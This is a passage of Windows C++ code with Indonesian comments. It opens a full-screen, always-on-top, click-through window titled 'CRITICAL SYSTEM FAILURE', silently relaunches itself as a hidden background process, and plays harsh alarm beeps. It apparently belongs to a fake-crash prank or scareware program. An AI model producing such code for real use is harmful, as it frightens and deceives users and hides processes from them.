        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, 
        L"CRITICAL SYSTEM FAILURE",
        WS_POPUP, 
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        NULL, NULL, hInst, NULL
    );
    
    SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        SWP_SHOWWINDOW
    );
    
    ShowWindow(hwnd, SW_SHOW);
    
    // Jalankan background process
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = szPath;
    sei.lpParameters = L"-background";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    // Mainkan suara startup
    std::thread([]() {
        for (int i = 0; i < 15; i++) {
            Beep(300, 80);
            Beep(600, 80);
            Beep(900, 80);
            Sleep(15);
        }
        
        for (int i = 0; i < 100; i++) {
            Beep(rand() % 5000 + 500, 20);
            Sleep(2);
        }
        
        for (int i = 0; i < 8; i++) {
            Beep(50 + i * 200, 300);
        }
        
        // Play system sound
        PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hMutex) {
        CloseHandle(hMutex);
    }
    
    // Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
    
    return static_cast<int>(msg.wParam);
}
